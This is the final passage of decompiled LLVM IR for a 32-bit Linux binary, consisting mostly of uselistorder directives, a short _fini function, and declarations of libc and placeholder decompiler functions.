234, 329, 363, 364, 365, 366, 367, 63, 368, 43, 369, 44, 370, 375, 376, 392, 377, 378, 379, 380, 385, 389, 390, 391, 23, 381, 61, 382, 383, 384, 45, 27, 386, 26, 46, 25, 387, 388, 24, 393, 28, 394, 47, 395, 29, 30, 31, 48, 32, 396, 49, 33, 69, 62, 422 }
  uselistorder void (i32)* @__pseudo_call, { 3, 2, 5, 0, 6, 7, 8, 4, 1 }
  uselistorder i32 -4, { 6, 7, 8, 4, 34, 35, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 36, 37, 38, 39, 43, 44, 45, 46, 3, 47, 0, 42, 48, 49, 50, 51, 52, 53, 5, 41, 29, 1, 40, 2, 30, 31, 32, 33 }
  uselistorder i32 ptrtoint (i32* @global_var_8052000.69 to i32), { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 -1, { 24, 25, 53, 156, 54, 157, 265, 158, 159, 160, 55, 161, 163, 162, 51, 4, 164, 165, 26, 14, 48, 166, 266, 167, 56, 57, 168, 58, 169, 145, 170, 59, 171, 172, 118, 61, 60, 173, 174, 175, 63, 62, 64, 176, 146, 9, 177, 178, 65, 66, 10, 147, 179, 267, 180, 67, 68, 181, 11, 182, 12, 268, 269, 13, 183, 184, 270, 1, 27, 28, 0, 185, 154, 155, 186, 187, 188, 5, 115, 69, 189, 275, 70, 71, 190, 72, 29, 19, 73, 22, 191, 192, 30, 31, 32, 76, 75, 74, 193, 113, 114, 18, 17, 16, 194, 195, 77, 196, 6, 277, 197, 278, 279, 198, 199, 280, 200, 20, 201, 202, 203, 78, 281, 204, 79, 205, 2, 206, 207, 282, 34, 283, 35, 284, 285, 208, 133, 134, 135, 125, 127, 128, 129, 130, 131, 132, 126, 7, 124, 116, 209, 121, 122, 123, 136, 137, 120, 138, 139, 140, 141, 142, 143, 144, 117, 119, 33, 210, 286, 287, 211, 288, 289, 297, 80, 212, 81, 213, 49, 50, 214, 82, 83, 215, 84, 216, 85, 217, 86, 218, 87, 219, 88, 220, 89, 221, 90, 222, 91, 223, 92, 224, 36, 225, 52, 93, 226, 95, 94, 96, 227, 97, 228, 21, 229, 148, 230, 298, 231, 232, 37, 292, 293, 40, 39, 41, 42, 23, 43, 98, 44, 233, 38, 294, 8, 234, 235, 236, 149, 237, 45, 290, 291, 99, 273, 274, 15, 276, 100, 238, 101, 239, 102, 240, 103, 241, 104, 242, 105, 243, 106, 244, 107, 245, 108, 246, 109, 247, 110, 248, 111, 249, 112, 250, 46, 251, 150, 252, 253, 271, 272, 296, 295, 254, 151, 255, 47, 256, 3, 257, 258, 259, 260, 261, 262, 263, 264, 152, 153 }
  uselistorder i32 1, { 359, 361, 360, 88, 241, 242, 11, 12, 10, 13, 278, 229, 363, 362, 8, 9, 364, 32, 575, 365, 140, 141, 302, 576, 577, 578, 243, 304, 579, 366, 580, 244, 581, 582, 378, 377, 376, 375, 374, 373, 372, 371, 370, 369, 368, 367, 162, 171, 168, 164, 169, 163, 167, 165, 166, 170, 583, 584, 0, 62, 61, 60, 59, 58, 379, 172, 173, 380, 33, 34, 109, 585, 586, 381, 82, 81, 83, 245, 382, 26, 587, 383, 14, 17, 18, 19, 16, 15, 588, 279, 386, 385, 384, 657, 213, 572, 658, 209, 659, 92, 660, 246, 661, 662, 52, 663, 664, 589, 590, 357, 387, 98, 591, 388, 389, 280, 665, 346, 174, 592, 593, 573, 248, 594, 595, 596, 597, 598, 600, 601, 602, 249, 603, 604, 338, 247, 605, 250, 606, 607, 608, 599, 393, 392, 391, 390, 41, 43, 42, 38, 40, 39, 44, 609, 394, 96, 93, 95, 94, 251, 395, 610, 611, 397, 396, 76, 75, 612, 613, 232, 231, 228, 614, 281, 615, 616, 230, 617, 252, 618, 305, 619, 399, 398, 54, 56, 55, 57, 253, 306, 1, 307, 400, 819, 820, 821, 136, 137, 135, 403, 402, 401, 87, 404, 405, 115, 203, 254, 255, 666, 215, 667, 333, 668, 669, 670, 214, 671, 233, 347, 91, 90, 672, 673, 407, 406, 175, 674, 408, 675, 409, 176, 676, 677, 410, 177, 178, 620, 621, 622, 623, 624, 625, 626, 627, 628, 414, 413, 412, 348, 411, 349, 49, 47, 48, 50, 629, 630, 416, 415, 350, 351, 100, 102, 101, 103, 105, 104, 282, 678, 679, 204, 277, 680, 681, 256, 682, 301, 683, 685, 417, 64, 2, 3, 689, 686, 687, 688, 216, 418, 132, 131, 421, 420, 419, 63, 422, 690, 423, 35, 644, 645, 646, 257, 647, 691, 692, 693, 424, 197, 196, 193, 194, 195, 303, 694, 695, 696, 697, 258, 110, 308, 309, 310, 698, 425, 311, 312, 699, 259, 4, 427, 426, 179, 313, 428, 151, 429, 107, 106, 822, 431, 430, 180, 181, 283, 823, 432, 182, 314, 201, 315, 700, 701, 702, 703, 704, 705, 706, 707, 238, 708, 436, 435, 434, 433, 45, 46, 316, 709, 710, 317, 318, 711, 438, 437, 439, 183, 440, 99, 319, 441, 205, 712, 713, 211, 714, 260, 217, 218, 715, 716, 210, 717, 718, 719, 720, 721, 261, 444, 443, 442, 722, 723, 724, 725, 726, 727, 728, 729, 208, 234, 730, 262, 731, 732, 733, 263, 734, 735, 264, 736, 737, 738, 739, 740, 320, 358, 446, 445, 66, 65, 67, 284, 285, 791, 792, 793, 794, 219, 648, 649, 650, 447, 31, 741, 742, 743, 449, 448, 29, 28, 27, 450, 824, 451, 85, 84, 86, 452, 97, 453, 89, 454, 80, 455, 121, 457, 456, 116, 458, 184, 459, 134, 460, 185, 461, 186, 462, 187, 463, 465, 464, 114, 466, 51, 468, 467, 139, 469, 473, 472, 471, 470, 122, 825, 826, 827, 476, 475, 474, 78, 79, 77, 828, 286, 478, 477, 480, 479, 188, 287, 339, 571, 321, 481, 651, 652, 653, 337, 654, 482, 153, 154, 152, 155, 288, 483, 24, 25, 744, 206, 212, 745, 352, 484, 21, 23, 20, 22, 485, 72, 69, 68, 70, 74, 73, 71, 146, 143, 145, 147, 142, 144, 322, 487, 486, 323, 488, 324, 489, 325, 491, 490, 340, 494, 493, 492, 189, 326, 751, 752, 753, 495, 138, 754, 755, 220, 756, 757, 758, 150, 148, 149, 341, 750, 265, 190, 192, 191, 327, 759, 760, 761, 762, 763, 764, 765, 766, 767, 266, 768, 769, 770, 771, 772, 291, 773, 774, 202, 292, 775, 776, 777, 778, 289, 290, 779, 780, 781, 498, 497, 496, 159, 158, 157, 161, 160, 293, 294, 499, 295, 296, 267, 503, 502, 501, 500, 156, 342, 504, 505, 506, 507, 508, 746, 235, 747, 328, 239, 329, 748, 236, 513, 512, 511, 510, 509, 119, 120, 514, 515, 640, 641, 517, 516, 113, 112, 111, 684, 518, 520, 519, 36, 521, 118, 523, 522, 37, 524, 117, 525, 133, 527, 526, 124, 528, 125, 529, 198, 531, 530, 128, 532, 123, 534, 533, 108, 535, 130, 129, 631, 221, 222, 335, 240, 632, 5, 6, 207, 334, 633, 634, 635, 636, 637, 638, 297, 268, 639, 330, 343, 541, 540, 539, 538, 537, 536, 353, 126, 127, 344, 642, 643, 542, 655, 656, 574, 544, 543, 199, 749, 547, 546, 545, 782, 783, 548, 298, 331, 269, 784, 785, 554, 553, 552, 551, 550, 549, 786, 787, 237, 299, 788, 270, 271, 789, 790, 557, 556, 555, 354, 200, 795, 796, 558, 560, 559, 797, 798, 799, 807, 808, 227, 809, 562, 561, 30, 332, 7, 564, 563, 355, 272, 800, 224, 801, 802, 273, 803, 223, 805, 806, 274, 300, 345, 804, 356, 810, 565, 811, 812, 53, 813, 814, 275, 815, 816, 817, 225, 567, 566, 276, 818, 336, 226, 569, 568, 570 }
  uselistorder label %dec_label_pc_804fcd6, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_804fceb = load i32, i32* @ebx, align 4
  %v1_804fcec = call i32 @__get_pc_thunk_bx(i32 %v0_804fceb)
  store i32 %v1_804fcec, i32* @eax, align 4
  %v0_804fcf7 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_804fcf7

; uselistorder directives
  uselistorder i32* @eax, { 51, 53, 54, 80, 55, 57, 56, 58, 59, 61, 52, 60, 3, 25, 82, 0, 5, 83, 84, 4, 85, 1, 24, 2, 81, 86, 26, 87, 62, 63, 65, 18, 64, 88, 90, 89, 7, 8, 91, 92, 93, 27, 94, 95, 96, 97, 98, 99, 100, 101, 102, 28, 103, 104, 105, 29, 30, 106, 31, 107, 32, 33, 108, 131, 148, 109, 34, 110, 35, 111, 112, 113, 36, 114, 6, 37, 38, 115, 116, 39, 117, 40, 118, 119, 41, 42, 43, 120, 121, 122, 123, 44, 124, 125, 126, 127, 45, 150, 151, 49, 152, 153, 155, 50, 156, 9, 154, 12, 17, 149, 128, 19, 66, 67, 68, 69, 132, 134, 135, 133, 136, 137, 139, 140, 138, 129, 46, 10, 20, 70, 71, 72, 73, 74, 21, 22, 75, 76, 77, 78, 23, 48, 79, 13, 130, 47, 14, 141, 142, 15, 143, 144, 145, 157, 146, 147, 11, 16 }
  uselistorder i32 0, { 442, 443, 99, 444, 445, 446, 11, 200, 101, 100, 447, 448, 201, 449, 450, 451, 360, 452, 453, 454, 455, 622, 85, 456, 102, 457, 16, 86, 78, 458, 178, 103, 459, 79, 460, 361, 461, 244, 462, 463, 464, 465, 466, 467, 468, 469, 104, 362, 470, 471, 472, 473, 105, 474, 363, 106, 175, 245, 107, 364, 365, 366, 202, 475, 476, 477, 478, 203, 195, 196, 479, 480, 481, 482, 483, 484, 367, 204, 485, 108, 368, 486, 109, 205, 206, 487, 488, 246, 623, 624, 625, 369, 489, 490, 491, 492, 110, 111, 370, 626, 112, 627, 371, 87, 493, 179, 372, 373, 374, 494, 113, 495, 628, 12, 13, 14, 46, 375, 629, 632, 630, 631, 376, 633, 114, 115, 496, 497, 90, 498, 116, 377, 499, 180, 500, 47, 117, 501, 502, 503, 634, 635, 636, 207, 637, 504, 505, 506, 507, 508, 509, 510, 511, 512, 118, 378, 513, 208, 514, 515, 516, 517, 518, 17, 18, 379, 197, 198, 519, 520, 521, 522, 19, 523, 524, 525, 20, 380, 526, 21, 22, 119, 381, 527, 528, 529, 532, 530, 531, 23, 44, 48, 533, 534, 535, 536, 240, 537, 538, 120, 539, 121, 540, 382, 181, 541, 122, 542, 383, 543, 544, 546, 547, 548, 549, 550, 551, 123, 384, 385, 124, 552, 553, 386, 554, 555, 556, 557, 558, 387, 559, 560, 209, 388, 210, 561, 562, 563, 564, 565, 566, 24, 49, 50, 51, 389, 567, 125, 390, 568, 341, 569, 570, 126, 391, 83, 42, 74, 545, 182, 75, 818, 819, 820, 821, 80, 183, 211, 571, 823, 25, 53, 640, 647, 641, 642, 26, 43, 643, 644, 645, 392, 646, 52, 91, 92, 93, 638, 639, 127, 648, 649, 651, 652, 650, 653, 212, 654, 655, 656, 657, 658, 659, 128, 129, 393, 247, 248, 77, 572, 394, 573, 574, 56, 57, 575, 576, 577, 353, 578, 55, 395, 54, 396, 130, 0, 1, 397, 131, 132, 398, 399, 400, 133, 401, 662, 402, 660, 191, 661, 249, 250, 134, 2, 3, 403, 663, 664, 665, 666, 667, 251, 404, 405, 213, 824, 825, 135, 668, 27, 58, 611, 81, 82, 406, 669, 59, 407, 28, 136, 670, 60, 408, 671, 409, 673, 672, 184, 410, 411, 674, 676, 675, 185, 412, 677, 826, 827, 186, 829, 828, 61, 252, 413, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 214, 688, 414, 415, 689, 137, 690, 416, 691, 692, 756, 138, 417, 139, 253, 693, 694, 695, 696, 88, 29, 697, 62, 698, 699, 700, 701, 702, 703, 709, 710, 711, 712, 704, 705, 706, 707, 708, 63, 64, 418, 713, 714, 65, 66, 67, 419, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 140, 795, 796, 141, 797, 798, 799, 68, 89, 215, 94, 420, 733, 216, 217, 590, 831, 832, 757, 758, 759, 254, 760, 833, 95, 218, 761, 834, 580, 579, 835, 836, 837, 581, 582, 838, 788, 839, 142, 840, 845, 846, 15, 30, 421, 31, 98, 422, 423, 855, 856, 187, 857, 143, 342, 255, 256, 852, 4, 841, 842, 843, 144, 440, 352, 844, 612, 613, 614, 615, 424, 425, 616, 241, 426, 219, 145, 146, 427, 583, 428, 584, 147, 429, 148, 430, 735, 69, 736, 737, 738, 5, 431, 734, 257, 585, 586, 587, 588, 432, 149, 847, 343, 150, 220, 848, 851, 850, 764, 765, 766, 767, 768, 221, 769, 770, 771, 258, 762, 259, 763, 260, 433, 434, 261, 344, 435, 262, 345, 151, 436, 772, 773, 152, 153, 263, 346, 97, 774, 775, 776, 154, 155, 264, 347, 96, 777, 188, 778, 84, 779, 780, 782, 437, 781, 6, 589, 7, 849, 591, 592, 593, 594, 596, 595, 739, 438, 222, 740, 439, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 800, 45, 822, 156, 597, 858, 789, 598, 830, 859, 860, 783, 752, 599, 853, 854, 176, 600, 177, 192, 157, 158, 223, 265, 159, 354, 601, 160, 224, 602, 603, 266, 604, 267, 348, 161, 605, 349, 10, 606, 225, 607, 242, 608, 609, 610, 226, 227, 193, 194, 355, 617, 356, 268, 618, 620, 269, 270, 619, 70, 621, 357, 199, 272, 162, 271, 350, 351, 163, 753, 754, 755, 228, 358, 273, 784, 164, 165, 166, 167, 229, 785, 168, 169, 230, 786, 787, 170, 790, 791, 792, 359, 231, 171, 172, 233, 793, 173, 232, 794, 234, 32, 801, 802, 803, 274, 275, 813, 33, 34, 76, 35, 237, 238, 804, 805, 806, 807, 189, 235, 236, 239, 808, 809, 810, 811, 36, 37, 71, 812, 243, 38, 39, 814, 72, 40, 41, 73, 276, 277, 8, 9, 815, 816, 817, 174, 441, 190, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 861, 862, 863, 864, 865, 866, 867, 868 }
  uselistorder i32* @ebx, { 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 212, 213, 49, 50, 51, 52, 4, 53, 54, 55, 5, 56, 6, 57, 58, 214, 7, 215, 216, 217, 8, 218, 219, 220, 221, 222, 223, 224, 59, 60, 9, 61, 62, 63, 64, 65, 66, 67, 225, 226, 227, 228, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 229, 230, 231, 232, 10, 233, 11, 234, 235, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 116, 117, 12, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 13, 131, 132, 133, 134, 135, 35, 36, 37, 38, 111, 113, 112, 114, 115, 435, 436, 14, 437, 438, 441, 442, 136, 137, 138, 139, 140, 141, 443, 444, 445, 236, 238, 241, 242, 243, 244, 245, 239, 237, 240, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 266, 267, 1, 268, 269, 270, 271, 272, 273, 274, 446, 447, 448, 449, 450, 451, 452, 453, 454, 275, 276, 194, 195, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 455, 15, 456, 457, 458, 459, 30, 16, 28, 460, 461, 462, 463, 464, 465, 297, 298, 299, 300, 301, 302, 17, 303, 18, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 367, 368, 20, 318, 316, 317, 319, 322, 320, 321, 323, 324, 325, 19, 327, 326, 2, 328, 329, 330, 331, 332, 333, 21, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 170, 171, 172, 469, 470, 471, 472, 369, 22, 370, 371, 473, 474, 372, 373, 475, 154, 476, 477, 478, 479, 480, 155, 481, 425, 426, 374, 375, 376, 482, 483, 484, 33, 34, 0, 487, 488, 489, 502, 503, 504, 505, 31, 23, 29, 490, 496, 500, 501, 485, 486, 206, 207, 156, 157, 158, 159, 160, 161, 348, 351, 24, 3, 352, 349, 350, 163, 353, 354, 355, 162, 164, 165, 494, 495, 166, 167, 168, 169, 377, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 25, 392, 393, 378, 379, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 32, 405, 406, 407, 408, 409, 26, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 492, 493, 173, 174, 175, 356, 357, 358, 359, 360, 361, 27, 362, 363, 364, 439, 440, 176, 177, 178, 506, 507, 427, 428, 179, 180, 181, 466, 467, 468, 508, 509, 510, 511, 420, 421, 365, 366, 182, 183, 184, 491, 497, 498, 499, 185, 186, 187, 188, 189, 190, 191, 192, 193, 208, 209, 210, 211, 422, 423, 424, 429, 430, 512, 513, 514, 515, 431, 432, 433, 434 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8* @__decompiler_undefined_function_3() local_unnamed_addr

declare i64 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16 @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_7() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_8() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_9() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_10() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
